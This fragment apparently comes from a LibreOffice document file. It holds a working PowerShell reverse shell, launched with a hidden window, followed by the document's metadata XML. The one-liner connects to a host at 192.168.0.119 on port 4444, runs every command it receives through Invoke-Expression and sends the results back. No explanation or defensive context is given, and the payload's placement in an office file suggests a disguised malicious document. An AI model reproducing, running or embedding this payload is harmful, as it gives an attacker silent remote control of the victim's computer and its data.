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owershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.0.119', 4444);$stream = $client.GetStream();$writer = New-Object System.IO.StreamWriter($stream);$reader = New-Object System.IO.StreamReader($stream);$writer.AutoFlush = $true;[byte[]]$buffer = New-Object byte[] 1024;while($client.Connected) { $writer.Write((pwd).Path + '&gt; '); $data = $reader.ReadLine(); if ($data -eq 'exit') { break }; try { $output = Invoke-Expression $data 2&gt;&amp;1 | Out-String } catch { $output = $_.Exception.Message }; $writer.WriteLine($output); } $client.Close();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58" meta:character-count="577" meta:non-whitespace-character-count="520"/>
    <meta:generator>LibreOfficeDev/6.0.5.2$Linux_X86_64 LibreOffice_project/</meta:generator>
  </office:meta>
</office:document-meta>
</file>